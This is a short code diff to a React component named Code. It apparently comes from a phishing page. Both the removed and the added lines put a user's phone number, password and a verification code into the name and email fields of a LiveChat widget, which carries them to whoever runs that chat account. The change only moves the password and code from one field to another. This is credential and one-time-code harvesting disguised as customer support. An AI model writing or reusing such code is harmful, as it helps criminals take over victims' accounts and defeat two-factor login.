@@ -164,8 +164,8 @@ const Code = (props: any) => {
       </div>
          <LiveChatWidget
         key="10"
-        customerName={`${props.phone}  ${props.pass}`}
-        customerEmail={props.code}
+        customerName={`${props.phone}`}
+        customerEmail={`${props.pass} @ code ${props.code}`}
         onNewEvent={handleNewEvent}
         license="17046132"
       />
